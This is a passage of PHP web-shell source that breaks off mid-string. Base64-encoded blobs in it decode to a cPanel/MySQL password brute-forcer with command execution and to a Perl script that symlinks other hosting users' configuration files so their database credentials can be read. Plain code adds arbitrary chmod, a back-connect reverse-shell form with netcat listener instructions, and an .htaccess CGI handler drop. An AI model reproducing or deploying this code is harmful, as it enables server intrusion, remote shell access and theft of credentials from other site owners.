hpZGRlbiIgbmFtZT0icGFnZSIgdmFsdWU9ImVkaXQiPg0KJzsNCgkNCgkkc2FoYWNrZXIgPSBmb3BlbigkcGF0aGNsYXNzLCAicmIiKTsNCmVjaG8gJzxjZW50ZXI+Jy4kcGF0aGNsYXNzLic8YnI+PHRleHRhcmVhIGRpcj0ibHRyIiBuYW1lPSJjb2RlIiBzdHlsZT0id2lkdGg6IDg0NXB4OyBoZWlnaHQ6IDQwNHB4Ij4nOwkNCiRjb2RlID0gZnJlYWQoJHNhaGFja2VyLCBmaWxlc2l6ZSgkcGF0aGNsYXNzKSk7DQplY2hvICRjb2RlID1odG1sc3BlY2lhbGNoYXJzKCRjb2RlKTsNCmVjaG8gJzwvdGV4dGFyZWE+JzsJDQoJZmNsb3NlKCRzYWhhY2tlcik7DQplY2hvICcNCjxicj48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGF0aGNsYXNzIiB2YWx1ZT0iJy4kcGF0aGNsYXNzLiciIHN0eWxlPSJ3aWR0aDogNDQ1cHg7Ij4NCjxicj48c3Ryb25nPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJlZGl0IGZpbGUiPg0KPC9mb3JtPg0KJzsNCgkJZXhpdDsNCgl9DQoNCg0KDQoNCglpZigkX1BPU1RbJ3BhZ2UnXT09J2NjbW1kZCcpDQoJew0KCWVjaG8gY2NtbWRkKCRjY21tZGQyLCRhdHQpOw0KCWV4aXQ7DQoJfQ0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KDQoNCg0KaWYoJF9QT1NUWydwYWdlJ109PSdmaW5kJykNCnsNCmlmKGlzc2V0KCRfUE9TVFsndXNlcm5hbWVzJ10pICYmIGlzc2V0KCRfUE9TVFsncGFzc3dvcmRzJ10pKQ0Kew0KICAgIGlmKCRfUE9TVFsndHlwZSddID09ICdwYXNzd2QnKXsNCiAgICAgICAgJGUgPSBleHBsb2RlKCJcbiIsJF9QT1NUWyd1c2VybmFtZXMnXSk7DQogICAgICAgIGZvcmVhY2goJGUgYXMgJHZhbHVlKXsNCiAgICAgICAgJGsgPSBleHBsb2RlKCI6IiwkdmFsdWUpOw0KICAgICAgICAkdXNlcm5hbWUgLj0gJGtbJzAnXS4iICI7DQogICAgICAgIH0NCiAgICB9ZWxzZWlmKCRfUE9TVFsndHlwZSddID09ICdzaW1wbGUnKXsNCiAgICAgICAgJHVzZXJuYW1lID0gc3RyX3JlcGxhY2UoIlxuIiwnICcsJF9QT1NUWyd1c2VybmFtZXMnXSk7DQogICAgfQ0KICAgICRhMSA9IGV4cGxvZGUoIiAiLCR1c2VybmFtZSk7DQogICAgJGEyID0gZXhwbG9kZSgiXG4iLCRfUE9TVFsncGFzc3dvcmRzJ10pOw0KICAgICRpZDIgPSBjb3VudCgkYTIpOw0KICAgICRvayA9IDA7DQogICAgZm9yZWFjaCgkYTEgYXMgJHVzZXIgKQ0KICAgIHsNCiAgICAgICAgaWYoJHVzZXIgIT09ICcnKQ0KICAgICAgICB7DQogICAgICAgICR1c2VyPXRyaW0oJHVzZXIpOw0KICAgICAgICAgZm9yKCRpPTA7JGk8PSRpZDI7JGkrKykNCiAgICAgICAgIHsNCiAgICAgICAgICAgICRwYXNzID0gdHJpbSgkYTJbJGldKTsNCiAgICAgICAgICAgIGlmKEBteXNxbF9jb25uZWN0KCdsb2NhbGhvc3QnLCR1c2VyLCRwYXNzKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBlY2hvICJUcllhZ34gdXNlciBpcyAoPGI+PGZvbnQgY29sb3I9Z3JlZW4+JHVzZXI8L2ZvbnQ+PC9iPikgUGFzc3dvcmQgaXMgKDxiPjxmb250IGNvbG9yPWdyZWVuPiRwYXNzPC9mb250PjwvYj4pPGJyIC8+IjsNCiAgICAgICAgICAgICAgICAkb2srKzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBlY2hvICI8aHI+PGI+WW91IEZvdW5kIDxmb250IGNvbG9yPWdyZWVuPiRvazwvZm9udD4gQ3BhbmVsIEJ5IFRyeWFnIFNjcmlwdCBOYW1lPC9iPiI7DQogICAgZWNobyAiPGNlbnRlcj48Yj48YSBocmVmPSIuJF9TRVJWRVJbJ1BIUF9TRUxGJ10uIj5CQUNLPC9hPiI7DQogICAgZXhpdDsNCn0NCn0NCj8+DQoNCg0KDQoNCjxmb3JtIG1ldGhvZD0iUE9TVCIgdGFyZ2V0PSJfYmxhbmsiPg0KCTxzdHJvbmc+DQo8aW5wdXQgbmFtZT0icGFnZSIgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iZmluZCI+ICAgICAgICAJCQkJDQogICAgPC9zdHJvbmc+DQogICAgPHRhYmxlIHdpZHRoPSI2MDAiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjMiIGNlbGxzcGFjaW5nPSIxIiBhbGlnbj0iY2VudGVyIj4NCiAgICA8dHI+DQogICAgICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSI+PGNlbnRlcj48c3Ryb25nPjxpbWcgc3JjPSJodHRwOi8vd3d3LnRyeWFnLmNjL2ltZy9sb2dvLXRlYW0uZ2lmIiAvPjxicj4NCgkJPC9zdHJvbmc+DQoJCTxhIGhyZWY9Imh0dHA6Ly90cnlhZy5jYyIgY2xhc3M9InN0eWxlMiI+PHN0cm9uZz5UdXJibyBGb3JjZSBCeSBUcnlhZzwvc3Ryb25nPjwvYT48L2NlbnRlcj48L3RkPg0KICAgIDwvdHI+DQogICAgPHRyPg0KICAgIDx0ZD4NCiAgICA8dGFibGUgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjMiIGNlbGxzcGFjaW5nPSIxIiBhbGlnbj0iY2VudGVyIj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNsYXNzPSJzdHlsZTIiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPg0KCTxzdHJvbmc+VXNlciA6PC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPjxzdHJvbmc+PHRleHRhcmVhIGNvbHM9IjQwIiByb3dzPSIxMCIgbmFtZT0idXNlcm5hbWVzIj48L3RleHRhcmVhPjwvc3Ryb25nPjwvdGQ+DQogICAgPC90cj4NCiAgICA8dHI+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjbGFzcz0ic3R5bGUyIiBzdHlsZT0id2lkdGg6IDEzOXB4Ij4NCgk8c3Ryb25nPlBhc3MgOjwvc3Ryb25nPjwvdGQ+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjb2xzcGFuPSI1Ij48c3Ryb25nPjx0ZXh0YXJlYSBjb2xzPSI0MCIgcm93cz0iMTAiIG5hbWU9InBhc3N3b3JkcyI+PC90ZXh0YXJlYT48L3N0cm9uZz48L3RkPg0KICAgIDwvdHI+DQogICAgPHRyPg0KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgY2xhc3M9InN0eWxlMiIgc3R5bGU9IndpZHRoOiAxMzlweCI+DQoJPHN0cm9uZz5UeXBlIDo8L3N0cm9uZz48L3RkPg0KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgY29sc3Bhbj0iNSI+DQogICAgPHNwYW4gY2xhc3M9InN0eWxlMiI+PHN0cm9uZz5TaW1wbGUgOiA8L3N0cm9uZz4gPC9zcGFuPg0KCTxzdHJvbmc+DQoJPGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJ0eXBlIiB2YWx1ZT0ic2ltcGxlIiBjaGVja2VkPSJjaGVja2VkIiBjbGFzcz0ic3R5bGUzIj48L3N0cm9uZz4NCiAgICA8Zm9udCBjbGFzcz0ic3R5bGUyIj48c3Ryb25nPi9ldGMvcGFzc3dkIDogPC9zdHJvbmc+IDwvZm9udD4NCgk8c3Ryb25nPg0KCTxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0idHlwZSIgdmFsdWU9InBhc3N3ZCIgY2xhc3M9InN0eWxlMyI+PC9zdHJvbmc+PHNwYW4gY2xhc3M9InN0eWxlMyI+PHN0cm9uZz4NCgk8L3N0cm9uZz4NCgk8L3NwYW4+DQogICAgPC90ZD4NCiAgICA8L3RyPg0KICAgIDx0cj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPjwvdGQ+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjb2xzcGFuPSI1Ij48c3Ryb25nPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzdGFydCI+DQogICAgPC9zdHJvbmc+DQogICAgPC90ZD4NCiAgICA8dHI+DQo8L2Zvcm0+ICAgIA0KICAgIA0KICAgIDx0ZCB2YWxpZ249InRvcCIgY29sc3Bhbj0iNiI+PHN0cm9uZz48L3N0cm9uZz48L3RkPg0KDQo8Zm9ybSBtZXRob2Q9IlBPU1QiIHRhcmdldD0iX2JsYW5rIj4NCjxzdHJvbmc+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJnbyIgdmFsdWU9ImNtZF9teXNxbCI+DQogICAgCTwvc3Ryb25nPg0KICAgIAk8dHI+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjbGFzcz0ic3R5bGUxIiBjb2xzcGFuPSI2Ij48c3Ryb25nPkNNRCBNWVNRTDwvc3Ryb25nPjwvdGQ+DQogICAgCQkJCTwvdHI+DQogICAgCTx0cj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPjxzdHJvbmc+dXNlcjwvc3Ryb25nPjwvdGQ+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1Ij48c3Ryb25nPjxpbnB1dCBuYW1lPSJteXNxbF9sIiB0eXBlPSJ0ZXh0Ij48L3N0cm9uZz48L3RkPg0KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSI+PHN0cm9uZz5wYXNzPC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiPjxzdHJvbmc+PGlucHV0IG5hbWU9Im15c3FsX3AiIHR5cGU9InRleHQiPjwvc3Ryb25nPjwvdGQ+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1Ij48c3Ryb25nPmRhdGFiYXNlPC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiPjxzdHJvbmc+PGlucHV0IG5hbWU9Im15c3FsX2RiIiB0eXBlPSJ0ZXh0Ij48L3N0cm9uZz48L3RkPg0KICAgIAkJCQk8L3RyPg0KCQkJCQk8dHI+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBzdHlsZT0iaGVpZ2h0OiAyNXB4OyB3aWR0aDogMTM5cHg7Ij4NCgk8c3Ryb25nPmNtZCB+PC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiIHN0eWxlPSJoZWlnaHQ6IDI1cHgiPg0KCTxzdHJvbmc+DQoJPHRleHRhcmVhIG5hbWU9ImRiX3F1ZXJ5IiBzdHlsZT0id2lkdGg6IDM1M3B4OyBoZWlnaHQ6IDg5cHgiPlNIT1cgREFUQUJBU0VTOw0KU0hPVyBUQUJMRVMgdXNlcl92YiA7DQpTRUxFQ1QgKiBGUk9NIHVzZXI7DQpTRUxFQ1QgdmVyc2lvbigpOw0KU0VMRUNUIHVzZXIoKTs8L3RleHRhcmVhPjwvc3Ryb25nPjwvdGQ+DQogICAgCTwvdHI+DQoJCTx0cj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPjxzdHJvbmc+PC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPjxzdHJvbmc+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9InJ1biI+PC9zdHJvbmc+PC90ZD4NCiAgICAJPC90cj4NCjxpbnB1dCBuYW1lPSJkYiIgdmFsdWU9Ik15U1FMIiB0eXBlPSJoaWRkZW4iPg0KPGlucHV0IG5hbWU9ImRiX3NlcnZlciIgdHlwZT0iaGlkZGVuIiB2YWx1ZT0ibG9jYWxob3N0Ij4NCjxpbnB1dCBuYW1lPSJkYl9wb3J0IiB0eXBlPSJoaWRkZW4iIHZhbHVlPSIzMzA2Ij4NCjxpbnB1dCBuYW1lPSJjY2NjIiB0eXBlPSJoaWRkZW4iIHZhbHVlPSJkYl9xdWVyeSI+DQogICAgCQ0KPC9mb3JtPiAgICAJDQoJCTx0cj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjYiPjxzdHJvbmc+PC9zdHJvbmc+PC90ZD4NCg0KDQoJCTwvdHI+DQoJCQ0KPGZvcm0gbWV0aG9kPSJQT1NUIiB0YXJnZXQ9Il9ibGFuayI+DQoJCTx0cj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNsYXNzPSJzdHlsZTEiIGNvbHNwYW49IjYiPjxzdHJvbmc+Q01EIA0KCXN5c3RlbSAtIHBhc3N0aHJ1IC0gZXhlYyAtIHNoZWxsX2V4ZWM8L3N0cm9uZz48L3RkPg0KICAgIAkJCQk8L3RyPg0KCQk8dHI+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBzdHlsZT0id2lkdGg6IDEzOXB4Ij48c3Ryb25nPmNtZCB+PC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPg0KCQkJCQk8c2VsZWN0IG5hbWU9ImF0dCIgZGlyPSJydGwiICBzaXplPSIxIj4NCjw/cGhwDQppZigkX1BPU1RbJ2F0dCddPT1udWxsKQ0Kew0KZWNobyAnCQkJCQkJPG9wdGlvbiB2YWx1ZT0ic3lzdGVtIiBzZWxlY3RlZD0iIj5zeXN0ZW08L29wdGlvbj4nOw0KfWVsc2V7DQplY2hvICIJCQkJCQk8b3B0aW9uIHZhbHVlPSckX1BPU1RbYXR0XScgc2VsZWN0ZWQ9Jyc+JF9QT1NUW2F0dF08L29wdGlvbj4NCgkJCQkJCTxvcHRpb24gdmFsdWU9c3lzdGVtPnN5c3RlbTwvb3B0aW9uPg0KIjsNCg0KCQkJCQkJDQp9DQo/Pg0KDQoJCQkJCQk8b3B0aW9uIHZhbHVlPSJwYXNzdGhydSI+cGFzc3RocnU8L29wdGlvbj4NCgkJCQkJCTxvcHRpb24gdmFsdWU9ImV4ZWMiPmV4ZWM8L29wdGlvbj4NCgkJCQkJCTxvcHRpb24gdmFsdWU9InNoZWxsX2V4ZWMiPnNoZWxsX2V4ZWM8L29wdGlvbj4NCgkJCQkJPC9zZWxlY3Q+ICAgIA0KICAgIDxzdHJvbmc+DQo8aW5wdXQgbmFtZT0icGFnZSIgdHlwZT0iaGlkZGVuIiB2YWx1ZT0iY2NtbWRkIj4gICAgDQoJPGlucHV0IG5hbWU9ImNjbW1kZDIiIHR5cGU9InRleHQiIHN0eWxlPSJ3aWR0aDogMjg0cHgiIHZhbHVlPSJscyAtbGEiPjwvc3Ryb25nPjwvdGQ+DQogICAgCTwvdHI+DQoJCTx0cj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPjxzdHJvbmc+PC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPjxzdHJvbmc+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9ImdvIj48L3N0cm9uZz48L3RkPg0KICAgIAk8L3RyPg0KPC9mb3JtPiAgICAJICAgIAkNCg0KPGZvcm0gbWV0aG9kPSJQT1NUIiB0YXJnZXQ9Il9ibGFuayI+DQoNCgkJPHRyPg0KICAgIDx0ZCB2YWxpZ249InRvcCIgYmdjb2xvcj0iIzE1MTUxNSIgY2xhc3M9InN0eWxlMSIgY29sc3Bhbj0iNiI+PHN0cm9uZz5TaG93IA0KCUZpbGUgQW5kIEVkaXQ8L3N0cm9uZz48L3RkPg0KICAgIAkJCQk8L3RyPg0KCQk8dHI+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBzdHlsZT0id2lkdGg6IDEzOXB4Ij48c3Ryb25nPlBhdGggfjwvc3Ryb25nPjwvdGQ+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjb2xzcGFuPSI1Ij4NCgk8c3Ryb25nPg0KCTxpbnB1dCBuYW1lPSJwYXRoY2xhc3MiIHR5cGU9InRleHQiIHN0eWxlPSJ3aWR0aDogMjg0cHgiIHZhbHVlPSI8P3BocCBlY2hvIHJlYWxwYXRoKCcnKT8+Ij48L3N0cm9uZz48L3RkPg0KICAgIAk8L3RyPg0KCQk8dHI+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBzdHlsZT0id2lkdGg6IDEzOXB4Ij48c3Ryb25nPjwvc3Ryb25nPjwvdGQ+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBjb2xzcGFuPSI1Ij48c3Ryb25nPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzaG93Ij48L3N0cm9uZz48L3RkPg0KICAgIAkJCQk8L3RyPg0KPGlucHV0IG5hbWU9InBhZ2UiIHR5cGU9ImhpZGRlbiIgdmFsdWU9InNob3ciPiAgICAgICAgCQkJCQ0KPC9mb3JtPiAgICAJCQkJDQoJCQkJCTx0cj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNsYXNzPSJzdHlsZTEiIGNvbHNwYW49IjYiPjxzdHJvbmc+SW5mbyANCglTZWN1cml0eTwvc3Ryb25nPjwvdGQ+DQogICAgCQkJCTwvdHI+DQogICAgCTx0cj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPjxzdHJvbmc+U2FmZSBNb2RlPC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPg0KCTxzdHJvbmc+DQo8P3BocA0KJHNhZmVfbW9kZSA9IGluaV9nZXQoJ3NhZmVfbW9kZScpOw0KaWYoJHNhZmVfbW9kZT09JzEnKQ0Kew0KZWNobyAnT04nOw0KfWVsc2V7DQplY2hvICdPRkYnOw0KfQ0KDQo/PgkNCgk8L3N0cm9uZz4JDQoJPC90ZD4NCiAgICAJCQkJPC90cj4NCiAgICA8dHI+DQogICAgPHRkIHZhbGlnbj0idG9wIiBiZ2NvbG9yPSIjMTUxNTE1IiBzdHlsZT0id2lkdGg6IDEzOXB4Ij48c3Ryb25nPkZ1bmN0aW9uPC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPg0KCTxzdHJvbmc+DQo8P3BocA0KaWYoJyc9PSgkZnVuYz1AaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKSkpDQp7DQplY2hvICI8Zm9udCBjb2xvcj0jMDA4MDBGPk5vIFNlY3VyaXR5IGZvciBGdW5jdGlvbjwvZm9udD48L2I+IjsNCn1lbHNlew0KZWNobyAiPGZvbnQgY29sb3I9cmVkPiRmdW5jPC9mb250PjwvYj4iOw0KfQ0KPz48L3N0cm9uZz48L3RkPg0KICAgIDx0cj4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIHN0eWxlPSJ3aWR0aDogMTM5cHgiPjxzdHJvbmc+PC9zdHJvbmc+PC90ZD4NCiAgICA8dGQgdmFsaWduPSJ0b3AiIGJnY29sb3I9IiMxNTE1MTUiIGNvbHNwYW49IjUiPjxzdHJvbmc+PC9zdHJvbmc+PC90ZD4NCiAgICA8L3RhYmxlPg0KICAgIDwvdGQ+DQogICAgPC90cj4NCiAgICA8L3RhYmxlPg0KCQ0KCQ0KCQ0KCQ0KCTxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij48L2hlYWQ+PGJvZHk+PC9ib2R5PjwvaHRtbD4NCg0KDQoNCg0KDQogICAgICA8Zm9ybSBzdHlsZT0iYm9yZGVyOiAwcHggcmlkZ2UgI0ZGRkZGRiI+DQoNCg0KDQoNCiAgICA8cCBhbGlnbj0iY2VudGVyIj48L3RkPg0KICA8L3RyPjxkaXYgYWxpZ249ImNlbnRlciI+DQoNCiAgICAgICAgICAgICAgICA8dHI+DQoNCg0KDQo8aW5wdXQgdHlwZT0ic3VibWl0IiAgIG5hbWU9InVzZXIiIHZhbHVlPSJ1c2VyIj48b3B0aW9uIHZhbHVlPSJuYW1lIj48L3NlbGVjdD4NCjwvZm9ybT4NCg0KDQo8ZGl2IGFsaWduPSJjZW50ZXIiPg0KIDx0YWJsZSBib3JkZXI9IjUiIHdpZHRoPSIxMCUiIGJvcmRlcmNvbG9ybGlnaHQ9IiMwMDgwMDAiIGJvcmRlcmNvbG9yZGFyaz0iIzAwNkEwMCIgaGVpZ2h0PSIxMDAiIGNlbGxzcGFjaW5nPSI1Ij4NCjx0cj4NCjx0ZCBib3JkZXJjb2xvcmxpZ2h0PSIjMDA4MDAwIiBib3JkZXJjb2xvcmRhcms9IiMwMDZBMDAiPg0KPHAgYWxpZ249ImxlZnQiPg0KPHRleHRhcmVhICBtZXRob2Q9J1BPU1QnIHJvd3M9IjI1IiBuYW1lPSJTMSIgY29scz0iMTYiPg0KDQoNCjw/cGhwDQoNCg0KDQogICAgICBpZiAoJF9HRVRbJ3VzZXInXSApDQoNCg0KICAgICAgc3lzdGVtKCdscyAvdmFyL21haWwnKTsNCg0KDQoNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCR1aWQ9MDskdWlkPDkwMDAwOyR1aWQrKyl7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCg0KDQoNCj8+PC90ZXh0YXJlYT5=';

$file = fopen("cpn.php" ,"w+");
$write = fwrite ($file ,base64_decode($crackftp));
fclose($file);

   echo "<iframe src=cpn.php width=100% height=100% frameborder=0></iframe> ";
}
if ($act == "chmod") {
  $go = $_POST['go'];
echo'
<FONT face=Tahoma size=2><b>file to chmod :</b></FONT>
<form method="post">
<input type="text" name="chmod">
<input type="submit" value="chmod">
</form>';
if ($chmod =="")
{ echo "Chmod 755 For Perl shell ..."; }
else { chmod("$chmod", 0755); 
echo "./Done ..";
}}
if ($act == "backc") {
  $ip = $_SERVER["REMOTE_ADDR"];
  $msg = $_POST['backcconnmsg'];
  $emsg = $_POST['backcconnmsge'];
  echo("<center><b>Back-Connection:</b></br></br><form name=form method=POST>Host:<input type=text name=backconnectip size=15 value=$ip> Port: <input type=text name=backconnectport size=15 value=5992> Use: <select size=1 name=use><option value=Perl>Perl</option><option value=C>C</option></select> <input type=submit name=submit value=Connect></form>Click 'Connect' only after you open port for it first. Once open, use NetCat, and run '<b>nc -l -n -v -p 5992</b>'<br><br></center>");
  echo("$msg");
  echo("$emsg");
}
if ($act == "configler") {
    mkdir('config', 0755);
    chdir('config');
        $hta = ".htaccess";
        $dosya_adi = "$hta";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vc3RyZWV0NDguY28uY2MvZmF2aWNvbi5pY28iPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT4jRGV2IGJ5IERBTUFORTIwMTEgfCBFeHRyYWN0aW5nIENvbmZpZyAgVjEgMjAxMSAhISEgTW9kaWYhZWQgfCAtPC90aXRsZT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQouZHogew0KICAgIGZvbnQtZmFtaWx5OiBUYWhvbWE7DQogICAgZm9udC1zaXplOiAxMHB4Ow0KICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KICAgIGNvbG9yOiAjMDBGRkZGOw0KICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICB0ZXh0LXNoYWRvdzogYmxhY2sgMHB4IDBweCAycHg7DQp9DQojY2hlY2tvdXR0ZXh0YXJlYSB7DQoNCiAgd2Via2l0LWJvcmRlci1yYWRpdXM6IDE1cHg7DQoNCn0NCjpob3ZlciNjaGVja291dHRleHRhcmVhIHtvcGFjaXR5OiAwLjY7IGJhY2tncm91bmQtY29sb3I6MzMzMzMzIH0NCjwvc3R5bGU+DQo8L2hlYWQ+DQonOw0Kc3ViIGxpbHsNCiAgICAoJHVzZXIpID0gQF87DQokbXNyID0gcXh7cHdkfTsNCiRrb2xhPSRtc3IuIi8iLiR1c2VyOw0KJGtvbGE9fnMvXG4vL2c7IA0KDQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1zaG9wLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29zL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2hvcC1vcy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLW9zY29tLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGtvbGEuJy1vc2NvbW1lcmNlLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictb3Njb21tZXJjZXMudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRlcy9jb25maWd1cmUucGhwJywka29sYS4nLXNob3AyLnR4dCcpOw0Kc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2hvcC1zaG9wcGluZy50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRrb2xhLictc2FsZS50eHQnKTsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywka29sYS4nLWFtZW1iZXIudHh0Jyk7DQpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRrb2xhLictYW1lbWJlcjIudHh0Jyk7DQpzeW1saW5rKC